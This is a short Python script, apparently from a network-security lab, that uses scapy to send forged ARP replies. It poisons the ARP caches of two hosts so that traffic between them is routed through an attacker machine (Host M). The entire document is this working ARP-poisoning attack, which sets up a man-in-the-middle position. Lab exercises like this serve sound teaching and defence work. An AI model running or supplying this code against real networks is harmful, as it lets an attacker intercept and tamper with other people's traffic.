from scapy.all import ARP, send

def arp_poison(target_ip, target_mac, host_ip, host_mac):
    # Construct ARP reply packet for ARP cache poisoning
    arp_reply = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op=2)

    # Send ARP reply packet to poison the target's ARP cache
    send(arp_reply, verbose=False)
    print(f"ARP reply sent to {target_ip} to poison cache")

# Define host and target information
host_m_ip = "10.9.0.105"  # IP of Host M
host_m_mac = "02:42:0a:09:00:69"  # MAC address of Host M

host_a_ip = "10.9.0.5"  # IP of Host A
host_a_mac = "02:42:0a:09:00:05"  # MAC address of Host A

host_b_ip = "10.9.0.6"  # IP of Host B
host_b_mac = "02:42:0a:09:00:06"  # MAC address of Host B

# Poison Host A's ARP cache
arp_poison(host_a_ip, host_a_mac, host_b_ip, host_m_mac)

# Poison Host B's ARP cache
arp_poison(host_b_ip, host_b_mac, host_a_ip, host_m_mac)